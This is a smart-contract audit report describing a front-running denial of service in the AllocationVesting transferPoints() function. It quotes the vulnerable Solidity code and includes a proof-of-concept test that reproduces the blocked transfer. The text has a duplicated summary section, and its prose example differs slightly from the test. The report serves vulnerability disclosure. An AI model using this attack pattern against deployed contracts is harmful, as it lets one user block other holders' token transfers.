# Possible DoS of the AllocationVesting.transferPoints() by front-running 

## Summary
This bug report discusses an issue with the transferPoints() function in the AllocationVesting contract. The function checks if the sender and recipient have the same vesting periods before allowing a transfer of points. However, this can be exploited by malicious users who front-run a legal transfer, causing it to revert. This can result in users being unable to transfer points to their addresses indefinitely. The likelihood of this happening is medium, but there is no loss for the front-runner if they do it after their vesting period. A detailed proof of concept is provided, and the recommendation is to reconsider the vesting period validation mechanism.

## Summary
The `transferPoints()` function can be DoSed if a recipient address has a different vesting period by front-running.

## Finding Description
The `transferPoints()` function in `AllocationVesting.sol` checks if the sender and recipient have the same vesting periods.

```solidity
function transferPoints(address from, address to, uint24 points) external callerOrDelegated(from) {
    // revert on self-transfer to prevent infinite points exploit
    if (from == to) revert SelfTransfer();
    // revert on zero points input
    if (points == 0) revert ZeroAllocation();
    // cache allocation state of `from` and `to` addresses
    AllocationState memory fromAllocation = allocations[from];
    AllocationState memory toAllocation = allocations[to];
    // revert if `from` has less points allocation than they are trying to transfer
    if (fromAllocation.points < points) revert InsufficientPoints();
    // enforce identical vesting periods if `to` has an active vesting period
    if (toAllocation.numberOfWeeks != 0 && toAllocation.numberOfWeeks != fromAllocation.numberOfWeeks) { //@audit
        // DoS
        revert IncompatibleVestingPeriod(fromAllocation.numberOfWeeks, toAllocation.numberOfWeeks);
    }
}
```

Malicious users might use this validation to make it revert during a legal transfer. Here is a simple example:

- There are 2 investors - Alice and Bob who have 4 weeks and 8 weeks vesting periods.
- 4 weeks later, Bob is going to transfer the points to his other address.
- Alice transfers her points to Bob's address before Bob's transfer.
- Alice gets all of the vesting funds because her vesting period has ended already.
- But Bob's transfer reverts because his address has a different vesting period already.

## Impact Explanation
Users wouldn't be able to transfer points to their addresses forever.

## Likelihood Explanation
Medium, because there is no loss for a front-runner if they act after their vesting period.

## Proof of Concept
Here is a detailed proof of concept:

```solidity
function test_transferPoints_DoSByFrontrun() external {
    AllocationVesting.AllocationSplit[] memory allocationSplits = new AllocationVesting.AllocationSplit[](2);
    // allocate to 2 users 50% 50%
    allocationSplits[0].recipient = users.user1; // Alice
    allocationSplits[0].points = INIT_USER_POINTS;
    allocationSplits[0].numberOfWeeks = 4;
    allocationSplits[1].recipient = users.user2; // Bob
    allocationSplits[1].points = INIT_USER_POINTS;
    allocationSplits[1].numberOfWeeks = 8;
    
    // setup allocations
    uint256 vestingStart = block.timestamp + 1 weeks;
    allocationVesting.setAllocations(allocationSplits, vestingStart);
    
    // warp to vesting finish time of user1
    vm.warp(vestingStart + 4 weeks);
    
    // user1 transfers points (but claimed all) to user3
    vm.prank(users.user1);
    allocationVesting.transferPoints(users.user1, users.user3, INIT_USER_POINTS);
    
    // user1 has claimed all allocated vesting tokens
    assertEq(allocationVesting.vestingToken().balanceOf(users.user1), totalAllocation / 2);
    
    // user2 can't transfer to user3
    vm.expectRevert(abi.encodeWithSelector(AllocationVesting.IncompatibleVestingPeriod.selector, 8, 4));
    vm.prank(users.user2);
    allocationVesting.transferPoints(users.user2, users.user3, INIT_USER_POINTS);
}
```

## Recommendation
I don't have a straightforward mitigation, but we should reconsider the vesting period validation mechanism.
